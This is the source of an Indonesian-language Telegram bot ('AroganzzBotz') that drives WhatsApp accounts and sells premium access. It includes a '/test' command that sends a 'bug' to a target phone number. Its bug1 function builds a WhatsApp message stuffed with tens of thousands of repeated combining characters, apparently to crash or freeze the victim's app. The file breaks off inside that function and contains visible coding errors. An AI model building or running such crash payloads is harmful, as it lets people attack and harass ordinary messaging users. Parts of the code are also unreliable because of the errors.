const {
makeWASocket,
makeInMemoryStore,
fetchLatestBaileysVersion,
useMultiFileAuthState,
DisconnectReason,
proto,
prepareWAMessageMedia,
generateWAMessageFromContent
} = require("@whiskeysockets/baileys");

const { Telegraf, Markup, session } = require("telegraf");
const axios = require('axios');
const path = require("path");
const fs = require('fs');
const moment = require('moment-timezone');
const P = require("pino");
const chalk = require('chalk');
const crypto = require('crypto');

const bot = new Telegraf(BOT_TOKEN);
const { BOT_TOKEN } = require("./config");

//===============> [ Function ] <===============\\

const getUptime = () => {
const uptimeSeconds = process.uptime();
const hours = Math.floor(uptimeSeconds / 3600);
const minutes = Math.floor((uptimeSeconds % 3600) / 60);
const seconds = Math.floor(uptimeSeconds % 60);

return `${hours}h ${minutes}m ${seconds}s`;
};

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

const randomImages = [
"https://files.catbox.moe/jclwvi.jpg",
"https://files.catbox.moe/8rkwov.jpg"
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

function sleep(ms) {
return new Promise(resolve => setTimeout(resolve, ms));
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

const restartBot = () => {
pm2.connect((err) => {
if (err) {
console.error('Gagal terhubung ke PM2:', err);
return;
}

pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
pm2.disconnect(); // Putuskan koneksi setelah restart
if (err) {
console.error('Gagal merestart bot:', err);
} else {
console.log('Bot berhasil direstart.');
}
});
});
};

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

bot.use((ctx, next) => {
if (ctx.message && ctx.message.text) {
const message = ctx.message;
const senderName =
message.from.first_name || message.from.username || "Unknown";
const senderId = message.from.id;
const chatId = message.chat.id;
const isGrup =
message.chat.type === "group" || message.chat.type === "supergroup";
const groupName = isGrup ? message.chat.title : null;
const messageText = message.text;
const date = new Date(message.date * 1000).toLocaleString(); // Convert timestamp ke format waktu lokal

console.log(chalk.bold.cyan(`
┏━━━━━━[ 々 New Message ]
┃々 Pesan: ${messageText}
┃々 Tanggal: ${getCurrentDate}
┃々 Sender Name: ${senderName}
┃々 ID Sender: ${senderId}
┗━━━━━━━━━━━━━━━━━━━━━[ ≫ ]\n`
)
);


if (isGrup) {
console.log(chalk.bold.cyan(`
┏━━━━━━[ 々 New Message ]
┃々 Pesan: ${messageText}
┃々 Tanggal: ${getCurrentDate}
┃々 Group Name: ${groupName}
┃々 ID Group: ${chatId}
┗━━━━━━━━━━━━━━━━━━━━━[ ≫ ]\n`
)
);
}

console.log();
}
return next();
});

//===============> [ WhatsApp Line ] <===============\\

let bots = [];
bot.use(session());

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let XPanz = null;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const question = (query) => new Promise((resolve) => {
const rl = require('readline').createInterface({
input: process.stdin,
output: process.stdout
});
rl.question(query, (answer) => {
rl.close();
resolve(answer);
});
});

const GITHUB_TOKEN_LIST_URL =
"https://raw.githubusercontent.com/XPanzZyyOfficial/Database/refs/heads/main/dtbs.js";

async function fetchValidTokens() {
try {
const response = await axios.get(GITHUB_TOKEN_LIST_URL);
return response.data.tokens;
} catch (error) {
console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
return [];
}
}
async function validateToken() {
console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

console.log(chalk.bold.blue("Sedang Mengecek Database..."));

const validTokens = await fetchValidTokens();
if (!validTokens.includes(BOT_TOKEN)) {
console.log(chalk.bold.red("Token Lu Belom Ada Di Daftar, Pasti Nyolong Awowkwkwk"));
process.exit(1);
}

console.log(chalk.bold.green(`[!] System: Token Kamu Terdaftar Dalam Database! Terimakasih Sudah Membeli Script Ini.\n`));
startBot();
}

function startBot() {
console.clear();
console.log(chalk.bold.cyan(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`));
}

validateToken();

function saveActiveSessions(botNumber) {
try {
const sessions = [];
if (fs.existsSync(SESSIONS_FILE)) {
const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
if (!existing.includes(botNumber)) {
sessions.push(...existing, botNumber);
}
} else {
sessions.push(botNumber);
}
fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
} catch (error) {
console.error("Error saving session:", error);
}
}

async function initializeWhatsAppConnections() {
try {
if (fs.existsSync(SESSIONS_FILE)) {
const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ FOUND ACTIVE WHATSAPP SESSION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ TOTAL : ${activeNumbers.length}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

for (const botNumber of activeNumbers) {
console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ CURRENTLY CONNECTING WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
const sessionDir = createSessionDir(botNumber);
const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

const XPanz = makeWASocket({
auth: state,
printQRInTerminal: true,
logger: P({ level: "silent" }),
defaultQueryTimeoutMs: undefined,
});

await new Promise((resolve, reject) => {
XPanz.ev.on("connection.update", async (update) => {
const { connection, lastDisconnect } = update;
if (connection === "open") {
await new Promise(r => setTimeout(r, 2000)); // tunggu 2 detik

try {
await XPanz.newsletterFollow("120363418937884318@newsletter");
} catch (err) {
console.error("Gagal follow newsletter:", err);
}
console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ SUCCESSFUL NUMBER CONNECTION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
sessions.set(botNumber, XPanz);
resolve();
} else if (connection === "close") {
const shouldReconnect =
lastDisconnect?.error?.output?.statusCode !==
DisconnectReason.loggedOut;
if (shouldReconnect) {
console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ TRY RECONNECTING THE NUMBER
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
await initializeWhatsAppConnections();
} else {
reject(new Error("CONNECTION CLOSED"));
}
}
});

XPanz.ev.on("creds.update", saveCreds);
});
}
}
} catch (error) {
console.error("Error initializing WhatsApp connections:", error);
}
}

function createSessionDir(botNumber) {
const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
if (!fs.existsSync(deviceDir)) {
fs.mkdirSync(deviceDir, { recursive: true });
}
return deviceDir;
}
// --- Koneksi WhatsApp ---
async function connectToWhatsApp(botNumber, ctx) {
const chatId = ctx.chat.id;

const sentMsg = await ctx.telegram.sendMessage(
chatId,
`┏━━━━━━━━━━━━━━━━━━━━━━
┃   INFORMATION
┣━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┃⌬ STATUS : INITIALIZATIONℹ️
┗━━━━━━━━━━━━━━━━━━━━━━`,
{ parse_mode: "Markdown" }
);

const statusMessage = sentMsg.message_id;

const sessionDir = createSessionDir(botNumber);
const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

const XPanz = makeWASocket({
auth: state,
printQRInTerminal: false,
logger: P({ level: "silent" }),
defaultQueryTimeoutMs: undefined,
});

XPanz.ev.on("connection.update", async (update) => {
const { connection, lastDisconnect } = update;

if (connection === "close") {
const statusCode = lastDisconnect?.error?.output?.statusCode;
if (statusCode && statusCode >= 500 && statusCode < 600) {
await ctx.telegram.editMessageText(
chatId,
statusMessage,
null,
`┏━━━━━━━━━━━━━━━━━━━━
┃   INFORMATION
┣━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┃⌬ STATUS : RECONNECTING🔄
┗━━━━━━━━━━━━━━━━━━━━`,
{ parse_mode: "Markdown" }
);
await connectToWhatsApp(botNumber, ctx);
} else {
await ctx.telegram.editMessageText(
chatId,
statusMessage,
null,
`┏━━━━━━━━━━━━━━━━━━━━
┃   INFORMATION
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : FAILED 🔴
┗━━━━━━━━━━━━━━━━━━━━`,
{ parse_mode: "Markdown" }
);
try {
fs.rmSync(sessionDir, { recursive: true, force: true });
} catch (error) {
console.error("Error deleting session:", error);
}
}
} else if (connection === "open") {
sessions.set(botNumber, XPanz);
saveActiveSessions(botNumber);
await ctx.telegram.editMessageText(
chatId,
statusMessage,
null,
`┏━━━━━━━━━━━━━━━━━━━━
┃   INFORMATION
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : CONNECTED 🟢
┗━━━━━━━━━━━━━━━━━━━━`,
{ parse_mode: "Markdown" }
);
} else if (connection === "connecting") {
await new Promise((resolve) => setTimeout(resolve, 1000));
try {
if (!fs.existsSync(`${sessionDir}/creds.json`)) {
const code = await XPanz.requestPairingCode(botNumber, "ZAPHKIEL");
const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

await ctx.telegram.editMessageText(
chatId,
statusMessage,
null,
`┏━━━━━━━━━━━━━━━━━━━━━
┃   PAIRING SESSION
┣━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ CODE : ${formattedCode}
┗━━━━━━━━━━━━━━━━━━━━━`,
{ parse_mode: "Markdown" }
);
}
} catch (error) {
console.error("Error requesting pairing code:", error);
await ctx.telegram.editMessageText(
chatId,
statusMessage,
null,
`┏━━━━━━━━━━━━━━━━━━━━━
┃   PAIRING SESSION
┣━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : ${error.message}
┗━━━━━━━━━━━━━━━━━━━━━`,
{ parse_mode: "Markdown" }
);
}
}
});

XPanz.ev.on("creds.update", saveCreds);

return XPanz;
}

//===============> [ Middleware ] <===============\\
const premiumFile = './database/premium.json';
const ownerFile = './database/owner.json';

const loadJSON = (file) => {
if (!fs.existsSync(file)) return [];
return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

let ownerUsers = loadJSON(ownerFile);
let premiumUsers = loadJSON(premiumFile);

const checkOwner = (ctx, next) => {
if (!ownerUsers.includes(ctx.from.id.toString())) {
return ctx.replyWithPhoto(getRandomImage, {
caption: "<b>Lu Siapa Jir, Lu Bukan XPanzZyy Official</b>",
parse_mode: "HTML",
});
}
next();
};

const checkPremium = (ctx, next) => {
if (!premiumUsers.includes(ctx.from.id.toString())) {
return ctx.replyWithPhoto(getRandomImage, {
caption: "<b>Fitur Ini Khusus User Premium, Beli Akses Premium Ke Owner Dibawah</b>",
parse_mode: "HTML",
reply_markup: {
inline_keyboard: [
[{ text: "⌜ Dᴇᴠᴇʟᴏᴘᴇʀ ⌟", url: "https://t.me/XPanzZyyOfficial" }]
]
}
});
}
next();
};

const checkWhatsAppConnection = (ctx, next) => {
if (!isWhatsAppConnected) {
ctx.reply("❌ WhatsApp belum terhubung. Silakan hubungkan dengan Pairing Code terlebih dahulu.");
return;
}
next();
};

//===============> [ End Off All ] <===============\\

bot.command("start", async (ctx) => {
const textnya = `<blockquote>
<b><i>👋 Hii @${ctx.from.username || ctx.from.first_name}. I Am AroganzzBotz</i></b>
 
<b>┏━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
<b>┃       ⿻  ⌜  Iɴғᴏʀᴍᴀᴛɪᴏɴ  ⌟  ⿻</b>
<b>┣━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
<b>┃⌬ Runtime: ${getUptime()}</b>
<b>┃⌬ Owner: @XPanzZyyOfficial</b>
<b>┃⌬ Botz Name: AʀᴏɢᴀɴᴢᴢBᴏᴛᴢ</b>
<b>┃⌬ Your Name: ${ctx.from.first_name}</b>
<b>┃⌬ Your ID: ${ctx.from.id}</b>
<b>┗━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>

<b>┏━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
<b>┃       ⿻ ⌜  Oᴡɴᴇʀ Mᴇɴᴜ  ⌟ ⿻ </b>
<b>┣━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
<b>┃⌬ Addprem</b>
<b>┃⌬ Delprem</b>
<b>┃⌬ Cekprem</b>
<b>┃⌬ Restart</b>
<b>┗━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>

<b><i>© ZᴀᴘʜᴋɪᴇʟBᴏᴛᴢ</i></b>
</blockquote>`;

const buttons = [
[
{ text: '⌜ Dᴇᴠᴇʟᴏᴘᴇʀ ⌟', url: 'https://t.me/XPanzZyyOfficial' },
{ text: '⌜ Mʏ Cʜᴀɴɴᴇʟ ⌟', url: 'https://t.me/XPanzZyyOfficial' }
],
[
{ text: '⌜ Cᴇᴋ ID ⌟', callback_data: "cekid" }
]
[
{ text: '⌜ Bᴜɢ Mᴇɴᴜ ⌟', callback_data: 'aroganzz1' },
{ text: '⌜ Tᴏᴏʟs Mᴇɴᴜ ⌟', callback_data: 'aroganzz2' }
]
];

try {
await ctx.reply(textnya, {
parse_mode: "HTML",
reply_markup: { inline_keyboard: buttons }
});
} catch (err) {
console.error("Gagal kirim /start:", err.message);
await ctx.reply("❌ Gagal memuat menu.");
}
});

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

bot.action('aroganzz1', async (ctx) => {
const caption = `<blockquote>
<b><i>👋 Hii @${ctx.from.username || ctx.from.first_name}. I Am AroganzzBotz</i></b>
 
<b>┏━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
<b>┃       ⿻  ⌜  Iɴғᴏʀᴍᴀᴛɪᴏɴ  ⌟  ⿻</b>
<b>┣━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
<b>┃⌬ Runtime: ${getUptime()}</b>
<b>┃⌬ Owner: @XPanzZyyOfficial</b>
<b>┃⌬ Botz Name: AʀᴏɢᴀɴᴢᴢBᴏᴛᴢ</b>
<b>┃⌬ Your Name: ${ctx.from.first_name}</b>
<b>┃⌬ Your ID: ${ctx.from.id}</b>
<b>┗━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>

<b>┏━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
<b>┃       ⿻ ⌜  Oᴡɴᴇʀ Mᴇɴᴜ  ⌟  ⿻ </b>
<b>┣━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
<b>┃⌬ Addprem</b>
<b>┃⌬ Delprem</b>
<b>┃⌬ Cekprem</b>
<b>┃⌬ Restart</b>
<b>┃⌬ Addtoken</b>
<b>┗━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>

<b><i>© ZᴀᴘʜᴋɪᴇʟBᴏᴛᴢ</i></b>
</blockquote>`;
const buttons = [
[
{ text: '⌜ Dᴇᴠᴇʟᴏᴘᴇʀ ⌟', url: 'https://t.me/XPanzZyyOfficial' },
{ text: '⌜ Mʏ Cʜᴀɴɴᴇʟ ⌟', url: 'https://t.me/XPanzZyyOfficial' }
],
[
{ text: '⌜ Cᴇᴋ ID ⌟', callback_data: "cekid" }
]
[
{ text: '⌜ Sᴛᴀʀᴛ Bᴀᴄᴋ ⌟', callback_data: 'aroganzz1' }
]
];

try {
await ctx.editMessageText(caption, {
parse_mode: "HTML",
reply_markup: { inline_keyboard: buttons }
});
} catch (err) {
console.error("Gagal kirim /start:", err.message);
await ctx.reply("❌ Gagal memuat menu.");
}
});

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

bot.action('aroganzz2', async (ctx) => {
const caption = `<blockquote>
<b>┏━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
<b>┃       ⿻  ⌜  Iɴғᴏʀᴍᴀᴛɪᴏɴ  ⌟  ⿻</b>
<b>┣━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
<b>┃⌬ Runtime: ${getUptime()}</b>
<b>┃⌬ Owner: @XPanzZyyOfficial</b>
<b>┃⌬ Botz Name: AʀᴏɢᴀɴᴢᴢBᴏᴛᴢ</b>
<b>┃⌬ Your Name: ${ctx.from.first_name}</b>
<b>┃⌬ Your ID: ${ctx.from.id}</b>
<b>┗━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>

<b>┏━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
<b>┃       ⿻ ⌜  Tᴏᴏʟs Mᴇɴᴜ  ⌟ ⿻ </b>
<b>┣━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
<b>┃⌬ Play</b>
<b>┃⌬ Ytmp4</b>
<b>┃⌬ Ytmp3</b>
<b>┃⌬ Gimage</b>
<b>┃⌬ Pinterest</b>
<b>┃⌬ Tiktok</b>
<b>┃⌬ Tiktokmp3</b>
<b>┃⌬ Tiktoksearch</b>
<b>┃⌬ Brat</b>
<b>┃⌬ Bratgif</b>
<b>┃⌬ Qc</b>
<b>┃⌬ Iqc</b>
<b>┃⌬ Tourl</b>
<b>┃⌬ Spotifysearch</b>
<b>┃⌬ Spotifydownload</b>
<b>┗━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>

<b><i>© ZᴀᴘʜᴋɪᴇʟBᴏᴛᴢ</i></b>
</blockquote>`;
const buttons = [
[
{ text: '⌜ Dᴇᴠᴇʟᴏᴘᴇʀ ⌟', url: 'https://t.me/XPanzZyyOfficial' },
{ text: '⌜ Mʏ Cʜᴀɴɴᴇʟ ⌟', url: 'https://t.me/XPanzZyyOfficial' }
],
[
{ text: '⌜ Cᴇᴋ ID ⌟', callback_data: "cekid" }
]
[
{ text: '⌜ Sᴛᴀʀᴛ Bᴀᴄᴋ ⌟', callback_data: 'aroganzz1' }
]
];

try {
await ctx.editMessageText(caption, {
parse_mode: "HTML",
reply_markup: { inline_keyboard: buttons }
});
} catch (err) {
console.error("Gagal kirim /start:", err.message);
await ctx.reply("❌ Gagal memuat menu.");
}
});

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

bot.action("startback", async (ctx) => {
const textnya = `<blockquote>
<b><i>👋 Hii @${ctx.from.username || ctx.from.first_name}. I Am AroganzzBotz</i></b>
 
<b>┏━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
<b>┃       ⿻  ⌜  Iɴғᴏʀᴍᴀᴛɪᴏɴ  ⌟  ⿻</b>
<b>┣━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
<b>┃⌬ Runtime: ${getUptime()}</b>
<b>┃⌬ Owner: @XPanzZyyOfficial</b>
<b>┃⌬ Botz Name: AʀᴏɢᴀɴᴢᴢBᴏᴛᴢ</b>
<b>┃⌬ Your Name: ${ctx.from.first_name}</b>
<b>┃⌬ Your ID: ${ctx.from.id}</b>
<b>┗━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>

<b>┏━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
<b>┃       ⿻ ⌜  Oᴡɴᴇʀ Mᴇɴᴜ  ⌟ ⿻ </b>
<b>┣━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
<b>┃⌬ Addprem</b>
<b>┃⌬ Delprem</b>
<b>┃⌬ Cekprem</b>
<b>┃⌬ Restart</b>
<b>┃⌬ Addsender</b>
<b>┗━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>

<b><i>© ZᴀᴘʜᴋɪᴇʟBᴏᴛᴢ</i></b>
</blockquote>`;

const buttons = [
[
{ text: '⌜ Dᴇᴠᴇʟᴏᴘᴇʀ ⌟', url: 'https://t.me/XPanzZyyOfficial' },
{ text: '⌜ Mʏ Cʜᴀɴɴᴇʟ ⌟', url: 'https://t.me/XPanzZyyOfficial' }
],
[
{ text: '⌜ Cᴇᴋ ID ⌟', callback_data: "cekid" }
]
[
{ text: '⌜ Sᴛᴀʀᴛ Bᴀᴄᴋ ⌟', callback_data: 'aroganzz1' }
]
];

try {
await ctx.reply(textnya, {
parse_mode: "HTML",
reply_markup: { inline_keyboard: buttons }
});
} catch (err) {
console.error("Gagal kirim /start:", err.message);
await ctx.reply("❌ Gagal memuat menu.");
}
});

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

bot.action("cekid", async (ctx) => {
const user = ctx.from;
const id = user.id;
const username = user.username ? `@${user.username}` : "❌ Tidak ada";
const firstName = user.first_name || "❌ Tidak ada";
const lastName = user.last_name || "❌ Tidak ada";
const fullName = `${firstName} ${lastName !== "❌ Tidak ada" ? lastName : ""}`.trim();

const msg = `<blockquote>
<code>
<b>🆔 Informasi Telegram Anda</b>

<b>┏━━━━━━━━━━━━━━━━━━━━━━</b>
<b>┃⌬ ID: ${id}</b>
<b>┃⌬ Username: ${username}</b>
<b>┃⌬ Nama Depan: ${firstName}</b>
<b>┃⌬ Nama Belakang : ${lastName}</b>
<b>┃⌬ Nama Lengkap: ${fullName}</b>
<b>┗━━━━━━━━━━━━━━━━━━━━━━━</b>
</code>
</blockquote>`;

try {
await ctx.editMessageText(msg, {
parse_mode: "HTML",
});
} catch (err) {
console.error("Gagal tampilkan info cekid:", err.message);
await ctx.reply("❌ Gagal buka info ID.");
}
});

//===============> [ Owner Handle ] <===============\\

bot.command('addprem', checkOwner, (ctx) => {
const args = ctx.message.text.split(' ');
if (args.length < 2) {
return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
}

const userId = args[1];
if (premiumUsers.includes(userId)) {
return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status premium.`);
}

premiumUsers.push(userId);
saveJSON(premiumFile, premiumUsers);
return ctx.reply(`🎉 Pengguna ${userId} sekarang memiliki akses premium!`);
});

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

bot.command('delprem', checkOwner, (ctx) => {
const args = ctx.message.text.split(' ');
if (args.length < 2) {
return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
}

const userId = args[1];
if (!premiumUsers.includes(userId)) {
return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
}

premiumUsers = premiumUsers.filter(id => id !== userId);
saveJSON(premiumFile, premiumUsers);
return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar premium.`);
});

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

bot.command('cekprem', (ctx) => {
const userId = ctx.from.id.toString();
if (premiumUsers.includes(userId)) {
return ctx.reply(`✅ Anda adalah pengguna premium.`);
} else {
return ctx.reply(`❌ Anda bukan pengguna premium.`);
}
});

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

bot.command("addsender", checkOwner, async (ctx) => {
const args = ctx.message.text.split(" ");
if (args.length < 2) {
return await ctx.reply("❌ Format perintah salah. Gunakan: /addsender <nomor_wa>");
}

const inputNumber = args[1];
const botNumber = inputNumber.replace(/[^0-9]/g, "");
const chatId = ctx.chat.id;
try {
await connectToWhatsApp(botNumber, ctx);
} catch (error) {
console.error("Error in addsender:", error);
await ctx.reply("❌ Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.");
}
});

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

bot.command('restart', (ctx) => {
const userId = ctx.from.id.toString();
ctx.reply('Merestart bot...');
restartBot();
});

//===============> [ Bug Handle ] <===============\\

bot.command("test", checkWhatsAppConnection, checkPremium, async (ctx) => {
const q = ctx.message.text.split(" ")[1];
const userId = ctx.from.id;
if (!q) {
return ctx.reply(`Example:\n\n/test 628xxxx`);
}

let Number = q.replace(/[^0-9]/g, '');
let target = Number + "@s.whatsapp.net";

let ProsesAii = await ctx.reply(`
┏━━━━━━━━━━━━━━━━━━━━
┃ ⿻ ⌜ Sᴇɴᴅɪɴɢ Bᴜɢ ⌟ ⿻
┣━━━━━━━━━━━━━━━━━━━━
┃⌬ Tᴀʀɢᴇᴛ : ${target}
┃⌬ Tʏᴘᴇ Bᴜɢ : Test
┗━━━━━━━━━━━━━━━━━━━━`);

for (let i = 0; i < 1; i++) {
 await AllFuncAndro(target);
}

let DonesendBug = await ctx.reply(`
┏━━━━━━━━━━━━━━━━━━━━
┃ ⿻ ⌜ Sᴜᴄᴄᴇss Sᴇɴᴅɪɴɢ Bᴜɢ ⌟ ⿻
┣━━━━━━━━━━━━━━━━━━━━
┃⌬ Tᴀʀɢᴇᴛ : ${target}
┗━━━━━━━━━━━━━━━━━━━━`);
});

//===============> [ Api Bug ] <===============\\

const Poseidon = JSON.stringify({
status: true,
criador: "PoseidonApiBug",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});

const Node = [{ tag: "bot", attrs: { biz_bot: "1" } }];

//===============> [ Function Bug ] <===============\\

async function bug1(target) {
try {
const message = {
botInvokeMessage: {
message: {
newsletterAdminInviteMessage: {
newsletterJid: "123456789@newsletter",
newsletterName: "You Know Faridz?" + 
"ꦽ꙰꙰꙰".repeat(500) + 
"ꦾ꙰꙰꙰".repeat(60000),
jpegThumbnail: "https://files.catbox.moe/qbdvlw.jpg",
caption: "@0" + "ꦾ꙰꙰꙰".repeat(60000),
inviteExpiration: Date.now() + 9999999999,
},
},
},
nativeFlowMessage: {
messageParamsJson: "{꙰꙰".repeat(10000),
},
contextInfo: {
remoteJid: target,
participant: target,
stanzaId: XPanz.generateMessageTag(),
},
};

await XPanz.relayMessage(target, message, {
userJid: target,
});
} catch (error) {
console.log("error:\n" + error);
